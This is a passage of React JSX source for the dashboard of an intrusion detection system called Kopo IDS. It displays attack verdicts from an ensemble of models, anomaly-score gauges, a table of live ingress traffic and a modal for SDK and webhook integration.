              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 14, color: 'var(--text-secondary)', fontWeight: 600 }}>Awaiting Flow Telemetry</div>
                <div style={{ fontSize: 12, color: 'var(--text-muted)', marginTop: 4 }}>Select any attack category above or click Run Detection to inspect traffic</div>
              </div>
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
              
              {/* HERO VERDICT CARD */}
              <div style={{
                padding: '20px 22px',
                borderRadius: 'var(--radius-md)',
                border: `1px solid ${sevColor}`,
                background: `linear-gradient(180deg, ${sevColor}1c 0%, ${sevColor}08 100%)`,
                boxShadow: `0 0 25px ${sevColor}22`,
                position: 'relative',
                overflow: 'hidden'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                  <span style={{ fontSize: 11, letterSpacing: '0.06em', color: sevColor, fontWeight: 700, textTransform: 'uppercase', display: 'flex', alignItems: 'center', gap: 6 }}>
                    {isAttackVerdict ? <AlertTriangle size={13} /> : <ShieldCheck size={13} />}
                    {result.severity_label ? `${result.severity_label} SEVERITY` : 'VERDICT'}
                  </span>
                  <span style={{ fontSize: 12, fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)' }}>
                    Confidence: {(result.confidence * 100).toFixed(1)}%
                  </span>
                </div>

                <div style={{ display: 'flex', alignItems: 'center', gap: 10, flexWrap: 'wrap' }}>
                  <span style={{ fontSize: 26, fontWeight: 900, color: sevColor, letterSpacing: '0.02em', lineHeight: 1.1 }}>
                    {result.attack_type}
                  </span>
                  {result.attack_category && (
                    <span style={{
                      fontSize: 11, padding: '3px 10px', borderRadius: 12, fontWeight: 700,
                      background: 'rgba(255, 255, 255, 0.08)', color: 'var(--text-primary)', border: '1px solid var(--border)'
                    }}>
                      {result.attack_category}
                    </span>
                  )}
                </div>

                {/* Explanatory AI SOC Subtitle */}
                <div style={{ fontSize: 12, color: 'var(--text-secondary)', marginTop: 10, lineHeight: 1.5, borderTop: '1px solid var(--border)', paddingTop: 10 }}>
                  {result.attack_type === 'ANOMALY' ? (
                    <span>🚨 <b>Behavioral / Zero-Day Anomaly:</b> Flow strongly diverges from normal baseline (+{(result.anomaly_score * 100).toFixed(1)}% anomaly score). Flagged by Dual Deep Autoencoder & Isolation Forest.</span>
                  ) : result.attack_type === 'BENIGN' ? (
                    <span>🛡️ <b>Normal Traffic Cleared:</b> Protocol signatures, packet length distributions, and inter-arrival times conform to standard benign baseline.</span>
                  ) : (
                    <span>⚡ <b>Granular Attack Confirmed:</b> Classified as <b>{result.attack_type}</b> under category <b>{result.attack_category || 'Threat'}</b> by supervised model ensemble.</span>
                  )}
                </div>

                {/* Plain-Language Analyst Caption */}
                <div style={{
                  fontSize: 11, color: 'var(--text-primary)', background: 'var(--bg-elevated)',
                  border: '1px solid var(--border)', borderRadius: 'var(--radius-sm)',
                  padding: '8px 12px', marginTop: 10, lineHeight: 1.5, fontStyle: 'italic'
                }}>
                  💬 <b>Analyst Assessment:</b> {getPlainLanguageCaption(result)}
                </div>
              </div>

              {/* DUAL TELEMETRY GAUGES */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                
                {/* Gauge 1: Anomaly Score */}
                <div style={{
                  background: 'var(--bg-elevated)', border: `1px solid ${result.is_anomaly ? 'rgba(255,184,108,0.5)' : 'var(--border)'}`,
                  borderRadius: 'var(--radius-md)', padding: '14px 16px'
                }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                    <span style={{ fontSize: 11, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Anomaly Score</span>
                    <span style={{
                      fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 700,
                      background: result.is_anomaly ? 'rgba(255,184,108,0.18)' : 'rgba(57,211,83,0.15)',
                      color: result.is_anomaly ? '#ffb86c' : 'var(--accent-green)'
                    }}>
                      {result.is_anomaly ? 'ANOMALY' : 'NORMAL'}
                    </span>
                  </div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: result.is_anomaly ? '#ffb86c' : 'var(--accent-cyan)', fontFamily: 'var(--font-mono)' }}>
                    {result.anomaly_score != null ? `${(result.anomaly_score * 100).toFixed(1)}%` : '—'}
                  </div>
                  <div style={{ width: '100%', height: 5, background: 'var(--bg-base)', borderRadius: 3, marginTop: 8, overflow: 'hidden' }}>
                    <div style={{
                      width: `${(result.anomaly_score || 0) * 100}%`, height: '100%',
                      background: result.is_anomaly ? 'linear-gradient(90deg, #ffb86c, #ff4757)' : 'var(--accent-cyan)'
                    }} />
                  </div>
                </div>

                {/* Gauge 2: Ensemble Consensus */}
                <div style={{
                  background: 'var(--bg-elevated)', border: '1px solid var(--border)',
                  borderRadius: 'var(--radius-md)', padding: '14px 16px'
                }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                    <span style={{ fontSize: 11, color: 'var(--text-muted)', textTransform: 'uppercase' }}>Model Votes</span>
                    <span style={{ fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 700, background: 'rgba(255,255,255,0.06)', color: 'var(--text-primary)' }}>
                      {result.ensemble_votes?.attack}/{result.ensemble_votes?.total} ATTACK
                    </span>
                  </div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: 'var(--text-primary)', fontFamily: 'var(--font-mono)' }}>
                    {result.ensemble_votes?.attack >= 2 ? 'ATTACK CONSENSUS' : 'BENIGN MAJORITY'}
                  </div>
                  <div style={{ width: '100%', height: 5, background: 'var(--bg-base)', borderRadius: 3, marginTop: 8, overflow: 'hidden' }}>
                    <div style={{
                      width: `${((result.ensemble_votes?.attack || 0) / (result.ensemble_votes?.total || 5)) * 100}%`, height: '100%',
                      background: result.ensemble_votes?.attack >= 2 ? 'var(--accent-red)' : 'var(--accent-green)'
                    }} />
                  </div>
                </div>
              </div>

              {/* MODEL BREAKDOWN MATRIX */}
              <div style={{ background: 'var(--bg-elevated)', border: '1px solid var(--border)', borderRadius: 'var(--radius-md)', padding: '16px 18px' }}>
                <div style={{ fontSize: 11, color: 'var(--text-muted)', letterSpacing: '0.06em', textTransform: 'uppercase', fontWeight: 700, marginBottom: 12, display: 'flex', alignItems: 'center', gap: 6 }}>
                  <Cpu size={13} />
                  <span>Ensemble Architecture Breakdown</span>
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                  {Object.entries(result.model_results || {}).map(([key, m]) => {
                    const isAtk = m.is_attack || m.label === 'ATTACK' || (m.label && m.label !== 'BENIGN' && m.label !== 'NORMAL')
                    const color = isAtk ? 'var(--accent-red)' : 'var(--accent-green)'
                    const labelText = key === 'xgb' ? `${m.label}` : m.label
                    return (
                      <div key={key} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontSize: 12 }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 8, width: 140 }}>
                          <span style={{ fontFamily: 'var(--font-mono)', fontWeight: 700, color: 'var(--text-primary)' }}>
                            {key.toUpperCase()}
                          </span>
                          <span style={{ fontSize: 10, color: 'var(--text-muted)' }}>
                            {key === 'rf' ? 'Random Forest' : key === 'xgb' ? 'XGBoost Multi-Class' : key === 'lstm' ? 'LSTM Sequential' : key === 'iso' ? 'Isolation Forest' : 'Autoencoder'}
                          </span>
                        </div>
                        <div style={{ flex: 1, margin: '0 16px', height: 4, background: 'var(--bg-base)', borderRadius: 2, overflow: 'hidden' }}>
                          <div style={{ width: `${(m.confidence || 0) * 100}%`, height: '100%', background: color }} />
                        </div>
                        <span style={{ fontFamily: 'var(--font-mono)', fontWeight: 700, color, minWidth: 120, textAlign: 'right' }}>
                          {labelText} · {((m.confidence || 0) * 100).toFixed(1)}%
                        </span>
                      </div>
                    )
                  })}
                </div>
              </div>

              {/* SOC Audit / Incident Link */}
              {result.alert_id && (
                <div style={{
                  display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                  padding: '12px 16px', borderRadius: 'var(--radius-md)',
                  background: 'rgba(255, 71, 87, 0.08)', border: '1px solid rgba(255, 71, 87, 0.25)'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 12, color: 'var(--accent-red)', fontWeight: 600 }}>
                    <Flame size={15} />
                    <span>SOC Incident Alert #{result.alert_id} Dispatched</span>
                  </div>
                  <Link to="/alerts" style={{ display: 'flex', alignItems: 'center', gap: 4, color: 'var(--accent-cyan)', fontSize: 11, textDecoration: 'none', fontWeight: 600 }}>
                    View in Alerts <ExternalLink size={11} />
                  </Link>
                </div>
              )}

            </div>
          )}
        </div>

      </div>

      {/* REAL-TIME INGRESS TRAFFIC INSPECTOR (THIRD BUTTON FEATURE) */}
      {isIngressActive && (
        <div className="animate-slide" style={{
          marginTop: 24,
          background: 'var(--bg-surface)',
          border: '1px solid rgba(57, 211, 83, 0.4)',
          borderRadius: 'var(--radius-lg)',
          padding: '22px 24px',
          boxShadow: '0 0 24px rgba(57, 211, 83, 0.08)'
        }}>
          {/* Ingress Operational Header */}
          <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'space-between', alignItems: 'center', gap: 14, marginBottom: 18, borderBottom: '1px solid var(--border)', paddingBottom: 16 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <div style={{
                width: 38, height: 38, borderRadius: 'var(--radius-md)',
                background: 'rgba(57, 211, 83, 0.15)', border: '1px solid rgba(57, 211, 83, 0.3)',
                display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--accent-green)'
              }}>
                <Globe size={20} className="animate-pulse" />
              </div>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span style={{ fontSize: 15, fontWeight: 800, color: 'var(--text-primary)', letterSpacing: '0.04em' }}>
                    PROTECTED APPLICATION INGRESS TELEMETRY // LIVE STREAM
                  </span>
                  <span style={{
                    fontSize: 10, padding: '2px 8px', borderRadius: 12,
                    background: 'rgba(57, 211, 83, 0.15)', color: 'var(--accent-green)',
                    fontWeight: 700, border: '1px solid rgba(57, 211, 83, 0.3)'
                  }}>
                    ● LISTENING ON POST /api/detect
                  </span>
                </div>
                <div style={{ fontSize: 12, color: 'var(--text-secondary)', marginTop: 2, display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span>Target Service:</span>
                  <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)', fontWeight: 600 }}>{ingressHost}</span>
                  <span style={{ color: 'var(--text-muted)' }}>·</span>
                  <span>Direct Webhook & Reverse-Proxy Ingestion</span>
                </div>
              </div>
            </div>

            {/* Ingress Feed Control Toolbar */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, flexWrap: 'wrap' }}>
              <button
                onClick={() => setIsIngressSimulating(!isIngressSimulating)}
                style={{
                  display: 'flex', alignItems: 'center', gap: 6,
                  background: isIngressSimulating ? 'rgba(255, 71, 87, 0.15)' : 'rgba(57, 211, 83, 0.15)',
                  border: `1px solid ${isIngressSimulating ? 'var(--accent-red)' : 'var(--accent-green)'}`,
                  color: isIngressSimulating ? 'var(--accent-red)' : 'var(--accent-green)',
                  borderRadius: 'var(--radius-sm)', padding: '6px 14px', fontSize: 11, cursor: 'pointer',
                  fontWeight: 700
                }}
              >
                {isIngressSimulating ? <PauseCircle size={13} /> : <PlayCircle size={13} />}
                <span>{isIngressSimulating ? 'Pause Stream' : 'Resume Stream'}</span>
              </button>

              <select
                value={ingressInterval}
                onChange={e => setIngressInterval(Number(e.target.value))}
                style={{
                  background: 'var(--bg-elevated)', border: '1px solid var(--border)', color: 'var(--text-primary)',
                  fontSize: 11, padding: '6px 10px', borderRadius: 'var(--radius-sm)', outline: 'none', cursor: 'pointer', fontFamily: 'var(--font-mono)'
                }}
              >
                <option value={1}>Rate: 1s</option>
                <option value={2}>Rate: 2s</option>
                <option value={3}>Rate: 3s</option>
              </select>

              <button
                onClick={() => setShowSdkModal(true)}
                style={{
                  display: 'flex', alignItems: 'center', gap: 6,
                  background: 'rgba(0, 212, 255, 0.12)', border: '1px solid var(--accent-cyan)',
                  color: 'var(--accent-cyan)', borderRadius: 'var(--radius-sm)', padding: '6px 14px',
                  fontSize: 11, cursor: 'pointer', fontWeight: 700
                }}
              >
                <Code2 size={13} />
                <span>Connect Website (SDK & Webhook)</span>
              </button>

              <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, color: 'var(--text-secondary)', cursor: 'pointer', userSelect: 'none' }}>
                <input
                  type="checkbox"
                  checked={filterThreatOnly}
                  onChange={e => setFilterThreatOnly(e.target.checked)}
                  style={{ accentColor: 'var(--accent-red)' }}
                />
                <span>Threats Only</span>
              </label>

              <button
                onClick={() => setIngressLogs([])}
                title="Clear current stream history"
                style={{
                  display: 'flex', alignItems: 'center', gap: 4,
                  background: 'transparent', border: '1px solid var(--border)',
                  color: 'var(--text-muted)', borderRadius: 'var(--radius-sm)', padding: '6px 10px',
                  fontSize: 11, cursor: 'pointer'
                }}
              >
                <Trash2 size={12} />
              </button>
            </div>
          </div>

          {/* KPI Strip */}
          {(() => {
            const total = ingressLogs.length
            const threats = ingressLogs.filter(l => l.is_attack).length
            const benign = total - threats
            const threatRate = total > 0 ? ((threats / total) * 100).toFixed(1) : '0.0'
            return (
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 12, marginBottom: 18 }}>
                <div style={{ background: 'var(--bg-elevated)', border: '1px solid var(--border)', borderRadius: 'var(--radius-md)', padding: '12px 14px' }}>
                  <div style={{ fontSize: 10, color: 'var(--text-muted)', textTransform: 'uppercase', fontWeight: 700 }}>Total Inbound Flows</div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: 'var(--text-primary)', fontFamily: 'var(--font-mono)', marginTop: 4 }}>{total}</div>
                </div>
                <div style={{ background: 'var(--bg-elevated)', border: '1px solid var(--border)', borderRadius: 'var(--radius-md)', padding: '12px 14px' }}>
                  <div style={{ fontSize: 10, color: 'var(--accent-green)', textTransform: 'uppercase', fontWeight: 700 }}>Clean Web Traffic</div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', marginTop: 4 }}>
                    {benign} <span style={{ fontSize: 12, fontWeight: 500 }}>({total > 0 ? ((benign / total) * 100).toFixed(0) : 100}%)</span>
                  </div>
                </div>
                <div style={{ background: 'var(--bg-elevated)', border: '1px solid var(--border)', borderRadius: 'var(--radius-md)', padding: '12px 14px' }}>
                  <div style={{ fontSize: 10, color: 'var(--accent-red)', textTransform: 'uppercase', fontWeight: 700 }}>Threats Dropped & Mitigated</div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', marginTop: 4 }}>{threats}</div>
                </div>
                <div style={{ background: 'var(--bg-elevated)', border: '1px solid var(--border)', borderRadius: 'var(--radius-md)', padding: '12px 14px' }}>
                  <div style={{ fontSize: 10, color: 'var(--accent-amber)', textTransform: 'uppercase', fontWeight: 700 }}>Active Threat Ratio</div>
                  <div style={{ fontSize: 20, fontWeight: 800, color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', marginTop: 4 }}>{threatRate}%</div>
                </div>
              </div>
            )
          })()}

          {/* Ingress Stream Table */}
          <div style={{ overflowX: 'auto', border: '1px solid var(--border)', borderRadius: 'var(--radius-md)' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12, textAlign: 'left' }}>
              <thead>
                <tr style={{ background: 'var(--bg-elevated)', borderBottom: '1px solid var(--border)', color: 'var(--text-muted)', fontSize: 10, textTransform: 'uppercase', letterSpacing: '0.04em' }}>
                  <th style={{ padding: '10px 12px' }}>Timestamp</th>
                  <th style={{ padding: '10px 12px' }}>Source IP</th>
                  <th style={{ padding: '10px 12px' }}>Method & Request Path</th>
                  <th style={{ padding: '10px 12px' }}>AI Detection Verdict</th>
                  <th style={{ padding: '10px 12px' }}>Confidence</th>
                  <th style={{ padding: '10px 12px' }}>IDS Enforcement</th>
                  <th style={{ padding: '10px 12px', textAlign: 'right' }}>Forensic Action</th>
                </tr>
              </thead>
              <tbody>
                {ingressLogs.length === 0 ? (
                  <tr>
                    <td colSpan={7} style={{ padding: '36px 16px', textAlign: 'center', color: 'var(--text-muted)' }}>
                      <Activity size={24} className="animate-pulse" style={{ margin: '0 auto 8px', color: 'var(--accent-green)' }} />
                      <div style={{ fontSize: 13, color: 'var(--text-secondary)' }}>Awaiting live web traffic telemetry from protected application...</div>
                      <div style={{ fontSize: 11, marginTop: 4 }}>Simulating real requests to <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)' }}>{ingressHost}</span></div>
                    </td>
                  </tr>
                ) : (
                  ingressLogs
                    .filter(log => !filterThreatOnly || log.is_attack)
                    .map(log => {
                      const color = attackColor(log.label)
                      const isAtk = log.is_attack
                      return (
                        <tr
                          key={log.id}
                          className="animate-slide"
                          style={{
                            borderBottom: '1px solid var(--border)',
                            background: isAtk ? 'rgba(255, 71, 87, 0.04)' : 'transparent',
                            transition: 'background 0.15s'
                          }}
                        >
                          <td style={{ padding: '10px 12px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)', fontSize: 11, whiteSpace: 'nowrap' }}>
                            {log.time}
                          </td>
                          <td style={{ padding: '10px 12px', fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)', fontWeight: 600 }}>
                            {log.source_ip}
                          </td>
                          <td style={{ padding: '10px 12px' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                              <span style={{
                                fontSize: 9, padding: '2px 5px', borderRadius: 3, fontWeight: 800,
                                background: log.method === 'POST' ? 'rgba(57,211,83,0.15)' : 'rgba(0,212,255,0.15)',
                                color: log.method === 'POST' ? 'var(--accent-green)' : 'var(--accent-cyan)',
                                fontFamily: 'var(--font-mono)'
                              }}>
                                {log.method}
                              </span>
                              <span style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: isAtk ? 'var(--accent-red)' : 'var(--text-primary)', maxWidth: 360, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={log.path}>
                                {log.path}
                              </span>
                            </div>
                          </td>
                          <td style={{ padding: '10px 12px' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                              <span style={{ width: 6, height: 6, borderRadius: '50%', background: color }} />
                              <span style={{ fontFamily: 'var(--font-mono)', fontWeight: 700, color, fontSize: 11 }}>
                                {log.label}
                              </span>
                              <span style={{ fontSize: 10, color: 'var(--text-muted)' }}>({log.category})</span>
                            </div>
                          </td>
                          <td style={{ padding: '10px 12px', fontFamily: 'var(--font-mono)', fontWeight: 700, color: 'var(--text-primary)', fontSize: 11 }}>
                            {((log.confidence || 0) * 100).toFixed(1)}%
                          </td>
                          <td style={{ padding: '10px 12px' }}>
                            <span style={{
                              fontSize: 10, padding: '3px 8px', borderRadius: 'var(--radius-sm)', fontWeight: 700,
                              background: isAtk ? 'rgba(255,71,87,0.15)' : 'rgba(57,211,83,0.15)',
                              color: isAtk ? 'var(--accent-red)' : 'var(--accent-green)',
                              border: `1px solid ${isAtk ? 'rgba(255,71,87,0.3)' : 'rgba(57,211,83,0.3)'}`,
                              fontFamily: 'var(--font-mono)'
                            }}>
                              {log.action}
                            </span>
                          </td>
                          <td style={{ padding: '10px 12px', textAlign: 'right' }}>
                            <button
                              onClick={() => inspectIngressFlow(log)}
                              style={{
                                display: 'inline-flex', alignItems: 'center', gap: 4,
                                background: 'transparent', border: '1px solid var(--border)',
                                color: 'var(--accent-cyan)', padding: '4px 10px', borderRadius: 'var(--radius-sm)',
                                fontSize: 11, cursor: 'pointer', fontWeight: 600
                              }}
                            >
                              <span>Inspect in Studio</span>
                              <ArrowUpRight size={11} />
                            </button>
                          </td>
                        </tr>
                      )
                    })
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* SDK & WEBHOOK INTEGRATION MODAL */}
      {showSdkModal && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 1000,
          background: 'rgba(0, 0, 0, 0.75)', backdropFilter: 'blur(4px)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20
        }}>
          <div className="animate-slide" style={{
            background: 'var(--bg-surface)', border: '1px solid var(--border)',
            borderRadius: 'var(--radius-lg)', maxWidth: 800, width: '100%',
            maxHeight: '90vh', overflowY: 'auto', boxShadow: 'var(--card-shadow)',
            padding: 24
          }}>
            {/* Modal Header */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 16, borderBottom: '1px solid var(--border)', paddingBottom: 14 }}>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  <Code2 size={20} color="var(--accent-cyan)" />
                  <span style={{ fontSize: 16, fontWeight: 800, color: 'var(--text-primary)' }}>
                    CONNECT EXTERNAL WEBSITE TO KOPO IDS
                  </span>
                </div>
                <div style={{ fontSize: 12, color: 'var(--text-secondary)', marginTop: 4 }}>
                  Embed live telemetry streaming into your web app in 3 lines of code. Target API: <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)' }}>POST http://localhost:8000/api/detect</span>
                </div>
              </div>
              <button
                onClick={() => setShowSdkModal(false)}
                style={{ background: 'none', border: 'none', color: 'var(--text-muted)', cursor: 'pointer', padding: 4 }}
              >
                <X size={18} />
              </button>
            </div>

            {/* Language / Framework Tabs */}
            <div style={{ display: 'flex', gap: 6, marginBottom: 14 }}>
              {[
                { id: 'express', name: 'Express.js (Node)' },
                { id: 'fastapi', name: 'FastAPI / Python' },
                { id: 'nginx', name: 'Nginx Mirror' },
                { id: 'curl', name: 'cURL / Webhook' }
              ].map(tab => (
                <button
                  key={tab.id}
                  onClick={() => setActiveSdkTab(tab.id)}
                  style={{
                    padding: '8px 14px', fontSize: 11, fontWeight: activeSdkTab === tab.id ? 800 : 500,
                    borderRadius: 'var(--radius-sm)', border: 'none', cursor: 'pointer',
                    background: activeSdkTab === tab.id ? 'rgba(0, 212, 255, 0.18)' : 'var(--bg-elevated)',
                    color: activeSdkTab === tab.id ? 'var(--accent-cyan)' : 'var(--text-secondary)',
                    transition: 'all 0.15s'
                  }}
                >
                  {tab.name}
                </button>
              ))}
            </div>

            {/* Code Snippet Box */}
            <div style={{ position: 'relative', marginBottom: 18 }}>
              <pre style={{
                background: 'var(--code-bg)', border: '1px solid var(--border)',
                borderRadius: 'var(--radius-md)', padding: 16, margin: 0,
                color: '#e6edf3', fontFamily: 'var(--font-mono)', fontSize: 11,
                lineHeight: 1.5, overflowX: 'auto', maxHeight: 340
              }}>
                {SDK_SNIPPETS[activeSdkTab]}
              </pre>

              <button
                onClick={() => {
                  navigator.clipboard.writeText(SDK_SNIPPETS[activeSdkTab])
                  alert('Code snippet copied to clipboard!')
                }}
                style={{
                  position: 'absolute', top: 10, right: 10,
                  display: 'flex', alignItems: 'center', gap: 4,
                  background: 'rgba(0,0,0,0.6)', border: '1px solid var(--border)',
                  color: 'var(--accent-cyan)', padding: '5px 10px', borderRadius: 'var(--radius-sm)',
                  fontSize: 10, cursor: 'pointer', fontWeight: 600
                }}
              >
                <Copy size={11} />
                <span>Copy Code</span>
              </button>
            </div>

            {/* Modal Footer */}
            <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
              <button
                onClick={() => setShowSdkModal(false)}
                style={{
                  background: 'var(--accent-cyan)', color: '#ffffff',
                  border: 'none', borderRadius: 'var(--radius-sm)', padding: '8px 20px',
                  fontSize: 12, fontWeight: 700, cursor: 'pointer'
                }}
              >
                Done
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
